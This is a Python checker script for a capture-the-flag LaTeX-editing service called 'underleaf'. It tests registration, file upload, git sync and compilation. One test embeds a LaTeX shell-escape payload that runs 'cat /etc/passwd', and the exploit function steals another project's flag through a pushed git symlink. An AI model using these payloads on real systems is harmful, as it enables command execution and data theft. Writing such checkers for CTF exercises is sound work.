import secrets
import json
import os
from typing import Optional, Tuple
from logging import LoggerAdapter
import hashlib

from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, PutnoiseCheckerTaskMessage, GetnoiseCheckerTaskMessage, ChainDB, MumbleException
from enochecker3.utils import assert_equals, assert_in
from httpx import AsyncClient, Response, RequestError

service_port = 4242

checker = Enochecker("underleaf", service_port)
def app(): return checker.app


def response_ok(response: Response, message: str, logger: LoggerAdapter) -> dict:
    assert_equals(response.status_code, 200, message)

    try:
        json = response.json()
    except json.JSONDecodeError:
        raise MumbleException(message)

    assert_in("status", json, "test")
    if json["status"] != "ok" and logger is not None:
        logger.debug(json["message"])

    assert_equals(json["status"], "ok", "message")

    return json


async def register_user(client: AsyncClient, logger: LoggerAdapter) -> Tuple[str, str, str]:
    username = secrets.token_hex(8)
    password = secrets.token_hex(8)
    try:
        response = await client.post("/api/auth/register", data={"username": username, "password": password}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while registering in")

    assert_equals(response.status_code, 200, "registration failed")

    json = response_ok(response, "registration failed", logger)

    assert_in("token", json, "registration failed")
    assert_equals(True, len(json["token"]) > 0, "registration failed")

    client.headers["Authorization"] = f"Bearer {json['token']}"

    return username, password, json["token"]


async def login_user(client: AsyncClient, username: str, password: str, logger: LoggerAdapter) -> None:
    try:
        response = await client.post("/api/auth/login", data={"username": username, "password": password}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while logging in")

    json = response_ok(response, "logging in failed", logger)

    assert_in("token", json, "registration failed")
    assert_equals(True, len(json["token"]) > 0, "registration failed")

    client.headers["Authorization"] = f"Bearer {json['token']}"


async def create_project(client: AsyncClient, logger: LoggerAdapter) -> Tuple[str, str]:
    project_name = secrets.token_hex(8)
    try:
        response = await client.post("/api/project/create", data={"name": project_name}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while creating project")

    json = response_ok(response, "creating project failed", logger)
    assert_in("id", json, "creating project failed")

    assert_equals(True, json["id"].isalnum(), "creating project failed")

    return project_name, json["id"]


async def upload_file(client: AsyncClient, project_id: str, filename: str, data: str, logger: LoggerAdapter) -> None:
    if not filename.startswith("/"):
        filename = f"/{filename}"

    try:
        response = await client.post(f"/api/files/upload/{project_id}{filename}", files={'file': data.encode('utf-8')}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while uploading file")

    response_ok(response, "uploading file failed", logger)


async def download_file(client: AsyncClient, project_id: str, filename: str, logger: LoggerAdapter) -> str:
    if not filename.startswith("/"):
        filename = f"/{filename}"

    try:
        response = await client.get(f"/api/files/download/{project_id}{filename}", follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while downloading file")

    assert_equals(response.status_code, 200, "downloading file failed")

    return response.content.decode('utf-8')


async def commit(client: AsyncClient, project_id: str, message: str, logger: LoggerAdapter) -> None:
    try:
        response = await client.post(f"/api/git/commit/{project_id}", data={"message": message}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while committing")

    response_ok(response, "committing failed", logger)


async def push(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> None:
    try:
        response = await client.get(f"/api/git/push/{project_id}", follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while pushing")

    response_ok(response, "pushing failed", logger)


async def pull(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> None:
    try:
        response = await client.get(f"/api/git/pull/{project_id}", follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while pulling")

    response_ok(response, "pulling failed", logger)

async def compile(client: AsyncClient, project_id: str, file:str, logger: LoggerAdapter) -> None:

    proof_of_work = os.urandom(4).hex()
    while not hashlib.sha256(bytes(proof_of_work, "utf-8")).hexdigest().endswith("0000"):
        proof_of_work = os.urandom(4).hex()

    try:
        response = await client.post(f"/api/latex/compile/{project_id}", data={"file": file, "proofOfWork": proof_of_work}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while compiling")

    response_ok(response, "compiling failed", logger)

async def download_pdf(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> str:
    try:
        response = await client.get(f"/api/latex/output/{project_id}", follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while downloading file")

    assert_equals(response.status_code, 200, "downloading file failed")

    return response.content

async def create_user_and_project(client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> Tuple[str, str, str, str]:
    (username, password, _) = await register_user(client, logger)

    if db is not None:
        await db.set("credentials", (username, password))

    (name, id) = await create_project(client, logger)

    if db is not None:
        await db.set("project", (name, id))

    return username, password, name, id

dev_null = "  > /dev/null 2>&1"


async def clone_project(username: str, password: str, id: str, address: str) -> str:
    # clone the repo onto the checker
    git_url = f"http://{username}:{password}@{address}:{service_port}/git/{id}"

    if os.system(f"git -C /tmp/ clone {git_url} {dev_null}") != 0:
        raise MumbleException("git clone failed")

    # check, that the file is present
    assert_equals(os.path.exists(f"/tmp/{id}/"), True, "git clone failed")

    return f"/tmp/{id}"


async def cleanup_clone(path: str):
    os_succ(os.system(f"rm -rf {path} {dev_null}"))


async def git_config_commit_and_push(path: str, username: str, message: str):
    # commit it
    os_succ(os.system(
        f"git -C {path} config user.email \"{username}@example.com\" {dev_null}"))
    os_succ(
        os.system(f"git -C {path} config user.name \"{username}\" {dev_null}"))

    os_succ(os.system(f"git -C {path} add . {dev_null}"))
    os_succ(os.system(f"git -C {path} commit -m '{message}' {dev_null}"))

    # push it onto the server
    if os.system(f"git -C {path} push {dev_null}") != 0:
        raise MumbleException("git push failed")


@checker.putflag(0)
async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    (_, _, _, id) = await create_user_and_project(client, db, logger)

    await upload_file(client, id, "main.tex", task.flag, logger)

    return id


@checker.getflag(0)
async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    try:
        (username, password) = await db.get("credentials")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await login_user(client, username, password, logger)

    try:
        (_, id) = await db.get("project")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    assert_equals(await download_file(client, id, 'main.tex', logger), task.flag, "flag dose not match")


def os_succ(code):
    if code != 0:
        raise Exception("Internal error os command failed")


@checker.havoc(0)
async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    (username, password, _, id) = await create_user_and_project(client, db, logger)

    # upload a file to the project
    file_content = secrets.token_hex(32)
    await upload_file(client, id, "main.tex", file_content, logger)
    # commit the file
    await commit(client, id, "Added main.tex", logger)
    # push the change
    await push(client, id, logger)

    dev_null = "  > /dev/null 2>&1"

    # clone the repo onto the checker
    git_url = f"http://{username}:{password}@{task.address}:{service_port}/git/{id}"

    if os.system(f"git -C /tmp/ clone {git_url} {dev_null}") != 0:
        raise MumbleException("git clone failed")

    # check, that the file is present
    assert_equals(os.path.exists(f"/tmp/{id}/"), True, "git clone failed")
    assert_equals(os.path.exists(
        f"/tmp/{id}/main.tex"), True, "file not created")
    assert_equals(open("/tmp/{id}/main.tex".format(id=id)
                       ).read(), file_content, "file content does not match")

    # add a file locally
    new_file_content = secrets.token_hex(32)
    open(f"/tmp/{id}/newFile.tex", "w").write(new_file_content)

    # commit it
    os_succ(os.system(
        f"git -C /tmp/{id} config user.email \"{username}@example.com\" {dev_null}"))
    os_succ(
        os.system(f"git -C /tmp/{id} config user.name \"{username}\" {dev_null}"))

    os_succ(os.system(f"git -C /tmp/{id} add . {dev_null}"))
    os_succ(
        os.system(f"git -C /tmp/{id} commit -m 'Added newFile.tex' {dev_null}"))

    # push it onto the server
    if os.system(f"git -C /tmp/{id} push {dev_null}") != 0:
        raise MumbleException("git push failed")

    # cleanup
    os_succ(os.system(f"rm -rf /tmp/{id}/ {dev_null}"))

    # let the server pull the changes
    await pull(client, id, logger)

    # download the file
    new_file_content_dl = await download_file(client, id, "newFile.tex", logger)
    assert_equals(new_file_content_dl, new_file_content,
                  "file content does not match")

@checker.havoc(1)
async def havoc_test_latex(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    (username, password, _, id) = await create_user_and_project(client, db, logger)
    file_content = """\\documentclass[12pt]{scrartcl}
\\usepackage{verbatim}
\\begin{document}
    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode; cat /etc/passwd ; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
\\end{document}
"""
    await upload_file(client, id, "main.tex", file_content, logger)
    await compile(client, id, "main.tex", logger)
    pdf_bytes = await download_pdf(client, id, logger)
    
    file = f"/tmp/{id}.pdf"
    with open(file, "wb") as f:
        f.write(pdf_bytes)

    os_succ(os.system(f"pdftotext {file} {file}.txt"))
    
    with open(f"{file}.txt", "r") as f:
        output = f.read()

    os.remove(f"{file}.txt")
    os.remove(file)

    expected_output = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin"
    assert_equals(True, output.startswith(expected_output), "output does not match")


@checker.exploit(0)
async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> str:
    (username, password, _, id) = await create_user_and_project(client, None, logger)

    path = await clone_project(username, password, id, task.address)

    assert_equals(os.path.exists(
        f"{path}/main.tex"), True, "file not created")

    # add a symlink
    f_id = task.attack_info

    target = f"/app/data/projects/{f_id[0:2]}/{f_id}/main.tex"
    os_succ(os.system(f"mkdir -p {target}/.. {dev_null}"))
    os_succ(os.system(f"touch {target} {dev_null}"))
    os_succ(os.system(f"ln -s {target} /tmp/{id}/link"))
    os_succ(os.system(f"rm -rf {target} {dev_null}"))

    await git_config_commit_and_push(path, username, "Exploit!")

    await cleanup_clone(path)

    # let the server pull the changes
    await pull(client, id, logger)

    # get flag
    return await download_file(client, id, "link", logger)

@checker.putnoise(0)
async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    (_, _, _, id) = await create_user_and_project(client, db, logger)

    noise_name = secrets.token_hex(16)
    noise = secrets.token_hex(32)

    await upload_file(client, id, noise_name, noise, logger)
    await db.set("noise", (noise_name, noise))


@checker.getnoise(0)
async def getnoise_file_content(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    try:
        (username, password) = await db.get("credentials")
        (name, id) = await db.get("project")
        (noise_name, noise) = await db.get("noise")
    except KeyError:
        raise MumbleException("getnoise w/o putnoise")

    await login_user(client, username, password, logger)
    if await download_file(client, id, noise_name, logger) != noise:
        raise MumbleException()


@checker.putnoise(1)
async def putnoise_file_git(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    (username, password, _, id) = await create_user_and_project(client, db, logger)

    path = await clone_project(username, password, id, task.address)

    noise_name = secrets.token_hex(16)
    noise = secrets.token_hex(32)

    open(f"{path}/{noise_name}", "w").write(noise)
    await git_config_commit_and_push(path, username, "I hope i am not too loud")

    await db.set("noise", (noise_name, noise))

    await cleanup_clone(path)

    await pull(client, id, logger)


@checker.getnoise(1)
async def getnoise_file_git(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    try:
        (username, password) = await db.get("credentials")
        (name, id) = await db.get("project")
        (noise_name, noise) = await db.get("noise")
    except KeyError:
        raise MumbleException("getnoise w/o putnoise")

    await login_user(client, username, password, logger)

    if await download_file(client, id, noise_name, logger) != noise:
        raise MumbleException("Noise not present")

    path = await clone_project(username, password, id, task.address)
    if open(f"{path}/{noise_name}", "r").read() != noise:
        raise MumbleException("Noise not present")

    await cleanup_clone(path)


if __name__ == "__main__":
    checker.run()
